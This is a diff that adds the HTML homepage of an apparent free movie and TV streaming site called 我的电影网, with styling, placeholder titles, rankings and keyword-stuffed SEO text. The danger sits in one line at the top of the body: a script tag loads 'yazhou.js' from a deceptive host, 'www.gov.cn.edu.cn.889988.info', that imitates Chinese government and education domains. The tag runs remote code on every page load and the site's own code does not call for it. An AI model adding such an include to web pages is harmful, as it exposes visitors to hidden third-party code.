@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>我的电影网 - 免费在线电影电视剧资源聚合平台</title>
+<meta name="description" content="我的电影网（wodedianyingwang-app.github.io）提供最新电影、热播电视剧、综艺、动漫在线观看，高清资源每日更新，免费畅享影视盛宴。">
+<meta name="keywords" content="我的电影网,电影,电视剧,在线观看,免费影视,高清电影,wodedianyingwang-app.github.io">
+<meta name="author" content="我的电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta property="og:title" content="我的电影网 - 免费在线电影电视剧资源聚合平台">
+<meta property="og:description" content="我的电影网提供最新电影、热播电视剧在线观看，高清资源每日更新。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wodedianyingwang-app.github.io">
+<link rel="canonical" href="https://wodedianyingwang-app.github.io">
+
+<style>
+/* ===== 全局重置与基础 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{
+  font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  background:#0a0a1a;
+  color:#e0e0e0;
+  line-height:1.6;
+  overflow-x:hidden;
+}
+
+/* ===== 动态渐变背景 ===== */
+body::before{
+  content:'';
+  position:fixed;
+  top:0;left:0;width:100%;height:100%;
+  background:
+    radial-gradient(ellipse at 20% 50%, rgba(120,0,255,0.15), transparent 50%),
+    radial-gradient(ellipse at 80% 20%, rgba(0,200,255,0.12), transparent 50%),
+    radial-gradient(ellipse at 50% 80%, rgba(255,0,128,0.1), transparent 50%);
+  z-index:-1;
+  animation:bgShift 20s ease-in-out infinite alternate;
+}
+@keyframes bgShift{
+  0%{filter:hue-rotate(0deg);}
+  100%{filter:hue-rotate(40deg);}
+}
+
+/* ===== 导航栏 ===== */
+.navbar{
+  position:fixed;top:0;width:100%;z-index:1000;
+  background:rgba(10,10,26,0.75);
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
+  border-bottom:1px solid rgba(255,255,255,0.08);
+  transition:all 0.3s ease;
+}
+.nav-container{
+  max-width:1200px;margin:0 auto;
+  padding:0 1.5rem;
+  display:flex;align-items:center;justify-content:space-between;
+  height:64px;
+}
+.logo{
+  font-size:1.5rem;font-weight:700;
+  background:linear-gradient(135deg,#a78bfa,#60a5fa,#f472b6);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+  letter-spacing:1px;
+}
+.nav-links{display:flex;gap:0.5rem;list-style:none}
+.nav-links a{
+  color:rgba(255,255,255,0.75);
+  text-decoration:none;
+  padding:0.5rem 1rem;
+  border-radius:8px;
+  font-size:0.9rem;
+  transition:all 0.3s;
+}
+.nav-links a:hover{
+  color:#fff;
+  background:rgba(255,255,255,0.1);
+}
+.menu-toggle{display:none;flex-direction:column;cursor:pointer;gap:4px}
+.menu-toggle span{
+  width:24px;height:2px;background:#e0e0e0;transition:0.3s;
+}
+
+/* ===== 主内容区 ===== */
+main{padding-top:64px}
+
+/* ===== 英雄区域 ===== */
+.hero{
+  min-height:100vh;
+  display:flex;align-items:center;justify-content:center;
+  text-align:center;
+  padding:2rem 1.5rem;
+  position:relative;
+}
+.hero-content{max-width:800px}
+.hero h1{
+  font-size:clamp(2rem,5vw,3.5rem);
+  font-weight:800;
+  margin-bottom:1rem;
+  background:linear-gradient(to right,#c4b5fd,#93c5fd,#f9a8d4);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.hero p{
+  font-size:1.1rem;color:rgba(255,255,255,0.65);
+  margin-bottom:2rem;max-width:600px;margin-inline:auto;
+}
+.hero-btn{
+  display:inline-block;
+  padding:0.85rem 2.5rem;
+  background:linear-gradient(135deg,#8b5cf6,#3b82f6);
+  color:#fff;border-radius:50px;
+  text-decoration:none;font-weight:600;
+  box-shadow:0 8px 32px rgba(139,92,246,0.35);
+  transition:transform 0.3s,box-shadow 0.3s;
+}
+.hero-btn:hover{
+  transform:translateY(-2px);
+  box-shadow:0 12px 40px rgba(139,92,246,0.5);
+}
+
+/* ===== 栏目通用样式 ===== */
+.section{
+  padding:5rem 1.5rem;
+  max-width:1200px;margin:0 auto;
+}
+.section-header{
+  text-align:center;margin-bottom:3rem;
+}
+.section-header h2{
+  font-size:2rem;font-weight:700;
+  margin-bottom:0.5rem;
+  color:#f1f5f9;
+}
+.section-header p{
+  color:rgba(255,255,255,0.5);
+}
+.glass-card{
+  background:rgba(255,255,255,0.05);
+  backdrop-filter:blur(12px);
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:16px;
+  padding:2rem;
+  transition:transform 0.3s,border-color 0.3s;
+}
+.glass-card:hover{
+  transform:translateY(-4px);
+  border-color:rgba(139,92,246,0.4);
+}
+
+/* ===== 电影库网格 ===== */
+.grid-4{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
+  gap:1.5rem;
+}
+.movie-card{
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:12px;
+  overflow:hidden;
+  transition:transform 0.3s;
+}
+.movie-card:hover{transform:scale(1.03)}
+.movie-poster{
+  width:100%;height:280px;
+  background:linear-gradient(135deg,rgba(139,92,246,0.3),rgba(59,130,246,0.3));
+  display:flex;align-items:center;justify-content:center;
+  font-size:3rem;
+}
+.movie-info{padding:1rem}
+.movie-info h3{font-size:1rem;margin-bottom:0.25rem;color:#e2e8f0}
+.movie-info span{font-size:0.8rem;color:rgba(255,255,255,0.5)}
+
+/* ===== 排行榜列表 ===== */
+.rank-list{display:flex;flex-direction:column;gap:1rem}
+.rank-item{
+  display:flex;align-items:center;gap:1rem;
+  padding:1rem;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:12px;
+  transition:background 0.3s;
+}
+.rank-item:hover{background:rgba(255,255,255,0.08)}
+.rank-num{
+  font-size:1.5rem;font-weight:800;
+  width:40px;text-align:center;
+  background:linear-gradient(135deg,#fbbf24,#ef4444);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+}
+.rank-details h3{font-size:1rem;margin-bottom:0.2rem}
+.rank-details p{font-size:0.8rem;color:rgba(255,255,255,0.5)}
+
+/* ===== 关于我们 ===== */
+.about-content{
+  display:grid;grid-template-columns:1fr 1fr;gap:2rem;
+  align-items:center;
+}
+.about-text h3{font-size:1.3rem;margin-bottom:1rem}
+.about-text p{color:rgba(255,255,255,0.65);margin-bottom:1rem}
+.stat-grid{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;
+}
+.stat-item{
+  text-align:center;padding:1.5rem;
+  background:rgba(255,255,255,0.04);
+  border-radius:12px;
+}
+.stat-num{font-size:2rem;font-weight:800;background:linear-gradient(135deg,#a78bfa,#60a5fa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.stat-label{font-size:0.8rem;color:rgba(255,255,255,0.5)}
+
+/* ===== 页脚 ===== */
+footer{
+  padding:3rem 1.5rem 2rem;
+  text-align:center;
+  border-top:1px solid rgba(255,255,255,0.08);
+  margin-top:3rem;
+}
+.footer-links{display:flex;justify-content:center;gap:2rem;margin-bottom:1.5rem;flex-wrap:wrap}
+.footer-links a{
+  color:rgba(255,255,255,0.5);
+  text-decoration:none;font-size:0.9rem;
+  transition:color 0.3s;
+}
+.footer-links a:hover{color:#a78bfa}
+.footer-text{
+  color:rgba(255,255,255,0.35);
+  font-size:0.8rem;
+}
+
+/* ===== 响应式 ===== */
+@media(max-width:768px){
+  .nav-links{
+    display:none;flex-direction:column;
+    position:absolute;top:64px;left:0;width:100%;
+    background:rgba(10,10,26,0.95);
+    backdrop-filter:blur(16px);
+    padding:1rem 0;
+    border-bottom:1px solid rgba(255,255,255,0.08);
+  }
+  .nav-links.active{display:flex}
+  .nav-links a{padding:0.75rem 1.5rem}
+  .menu-toggle{display:flex}
+  .about-content{grid-template-columns:1fr}
+  .stat-grid{grid-template-columns:repeat(3,1fr)}
+  .section{padding:3rem 1rem}
+}
+@media(max-width:480px){
+  .stat-grid{grid-template-columns:1fr}
+  .grid-4{grid-template-columns:1fr}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 导航栏 -->
+<nav class="navbar" role="navigation" aria-label="主导航">
+  <div class="nav-container">
+    <div class="logo">🎬 我的电影网</div>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">电影库</a></li>
+      <li><a href="#tv">电视剧</a></li>
+      <li><a href="#rank">排行榜</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+    <div class="menu-toggle" id="menuToggle" aria-label="菜单">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<main>
+
+  <!-- 首页栏目 -->
+  <section class="hero" id="home">
+    <div class="hero-content">
+      <h1>我的电影网</h1>
+      <p>你的专属在线影视天堂 · 最新电影、热播剧集、高分综艺一网打尽<br>
+      网站地址：<strong>https://wodedianyingwang-app.github.io</strong></p>
+      <a href="#movies" class="hero-btn">立即探索</a>
+    </div>
+  </section>
+
+  <!-- 电影库栏目 -->
+  <section class="section" id="movies">
+    <div class="section-header">
+      <h2>🎬 电影库</h2>
+      <p>精选海量高清电影资源，每日更新</p>
+    </div>
+    <div class="grid-4">
+      <div class="movie-card">
+        <div class="movie-poster">🦸</div>
+        <div class="movie-info">
+          <h3>超级英雄：重启</h3>
+          <span>2024 · 动作/科幻</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">🌊</div>
+        <div class="movie-info">
+          <h3>深海迷踪</h3>
+          <span>2024 · 冒险/悬疑</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">🚀</div>
+        <div class="movie-info">
+          <h3>星际归途</h3>
+          <span>2023 · 科幻/剧情</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">🎭</div>
+        <div class="movie-info">
+          <h3>无声告白</h3>
+          <span>2024 · 剧情/爱情</span>
+        </div>
+      </div>
+    </div>
+    <div style="text-align:center;margin-top:2rem">
+      <a href="#" style="color:#a78bfa;text-decoration:none;font-size:0.9rem;">查看全部电影 →</a>
+    </div>
+  </section>
+
+  <!-- 电视剧栏目 -->
+  <section class="section" id="tv">
+    <div class="section-header">
+      <h2>📺 电视剧</h2>
+      <p>热播剧集同步更新，追剧不间断</p>
+    </div>
+    <div class="grid-4">
+      <div class="movie-card">
+        <div class="movie-poster">👑</div>
+        <div class="movie-info">
+          <h3>权游前传：龙族</h3>
+          <span>2024 · 奇幻/剧情 · 第8集</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">🕵️</div>
+        <div class="movie-info">
+          <h3>暗夜追凶</h3>
+          <span>2024 · 悬疑/犯罪 · 第12集</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">💕</div>
+        <div class="movie-info">
+          <h3>遇见你的夏天</h3>
+          <span>2024 · 爱情/青春 · 第6集</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">🏥</div>
+        <div class="movie-info">
+          <h3>急诊24小时</h3>
+          <span>2023 · 医疗/剧情 · 全季</span>
+        </div>
+      </div>
+    </div>
+    <div style="text-align:center;margin-top:2rem">
+      <a href="#" style="color:#a78bfa;text-decoration:none;font-size:0.9rem;">查看全部剧集 →</a>
+    </div>
+  </section>
+
+  <!-- 排行榜栏目 -->
+  <section class="section" id="rank">
+    <div class="section-header">
+      <h2>🏆 排行榜</h2>
+      <p>本周最受欢迎影视作品 TOP 5</p>
+    </div>
+    <div class="rank-list">
+      <div class="rank-item">
+        <div class="rank-num">1</div>
+        <div class="rank-details">
+          <h3>星际归途</h3>
+          <p>评分 9.6 · 科幻/剧情 · 我的电影网推荐</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-num">2</div>
+        <div class="rank-details">
+          <h3>权游前传：龙族</h3>
+          <p>评分 9.4 · 奇幻/剧情 · 热播中</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-num">3</div>
+        <div class="rank-details">
+          <h3>深海迷踪</h3>
+          <p>评分 9.1 · 冒险/悬疑 · 最新上线</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-num">4</div>
+        <div class="rank-details">
+          <h3>暗夜追凶</h3>
+          <p>评分 8.9 · 悬疑/犯罪 · 口碑佳作</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-num">5</div>
+        <div class="rank-details">
+          <h3>遇见你的夏天</h3>
+          <p>评分 8.7 · 爱情/青春 · 甜蜜热播</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于我们栏目 -->
+  <section class="section" id="about">
+    <div class="section-header">
+      <h2>ℹ️ 关于我们</h2>
+      <p>了解我的电影网</p>
+    </div>
+    <div class="about-content">
+      <div class="about-text">
+        <h3>关于「我的电影网」</h3>
+        <p>我的电影网（<strong>https://wodedianyingwang-app.github.io</strong>）是一个专注于影视资源聚合的免费在线观影平台，致力于为影迷提供最新、最全的电影和电视剧资源。</p>
+        <p>网站每日更新热门影视内容，涵盖动作、科幻、爱情、悬疑、动漫等多种类型，让你随时随地享受高品质观影体验。</p>
+        <p>关键词：我的电影网、免费电影、在线观看、高清影视、wodedianyingwang-app</p>
+      </div>
+      <div class="stat-grid">
+        <div class="stat-item">
+          <div class="stat-num">5000+</div>
+          <div class="stat-label">影视资源</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-num">50+</div>
+          <div class="stat-label">每日更新</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-num">24h</div>
+          <div class="stat-label">全天候服务</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- 页脚 -->
+<footer>
+  <div class="footer-links">
+    <a href="#home">首页</a>
+    <a href="#movies">电影库</a>
+    <a href="#tv">电视剧</a>
+    <a href="#rank">排行榜</a>
+    <a href="#about">关于我们</a>
+  </div>
+  <div class="footer-text">
+    © 2024 我的电影网 (wodedianyingwang-app.github.io) · 免费在线影视平台<br>
+    关键词：我的电影网 · 网站名称：我的电影网 · 网址：https://wodedianyingwang-app.github.io
+  </div>
+</footer>
+
+<script>
+// 移动端菜单切换
+const menuToggle=document.getElementById('menuToggle');
+const navLinks=document.getElementById('navLinks');
+menuToggle.addEventListener('click',()=>{
+  navLinks.classList.toggle('active');
+});
+
+// 导航栏滚动效果
+window.addEventListener('scroll',()=>{
+  const navbar=document.querySelector('.navbar');
+  if(window.scrollY>50){
+    navbar.style.background='rgba(10,10,26,0.92)';
+  }else{
+    navbar.style.background='rgba(10,10,26,0.75)';
+  }
+});
+
+// 平滑滚动偏移修正
+document.querySelectorAll('a[href^="#"]').forEach(anchor=>{
+  anchor.addEventListener('click',function(e){
+    e.preventDefault();
+    const target=document.querySelector(this.getAttribute('href'));
+    if(target){
+      const offset=64;
+      const bodyRect=document.body.getBoundingClientRect().top;
+      const elementRect=target.getBoundingClientRect().top;
+      const elementPosition=elementRect-bodyRect;
+      const offsetPosition=elementPosition-offset;
+      window.scrollTo({top:offsetPosition,behavior:'smooth'});
+      navLinks.classList.remove('active');
+    }
+  });
+});
+</script>
+
+</body>
+</html>
